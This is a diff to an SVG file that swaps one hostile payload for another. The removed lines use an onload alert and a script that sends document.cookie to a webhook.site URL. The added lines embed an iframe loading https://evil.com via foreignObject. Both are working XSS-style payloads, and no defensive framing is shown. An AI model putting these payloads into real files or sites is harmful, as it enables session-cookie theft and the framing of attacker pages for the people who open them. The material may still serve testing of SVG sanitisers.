@@ -1,6 +1,5 @@
-<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS');">
-  <script>
-    alert('SVG XSS'); 
-    fetch('https://webhook.site/yourhook?c=' + document.cookie);
-  </script>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <foreignObject width="100%" height="100%">
+    <iframe src="https://evil.com" width="100%" height="100%"></iframe>
+  </foreignObject>
 </svg>
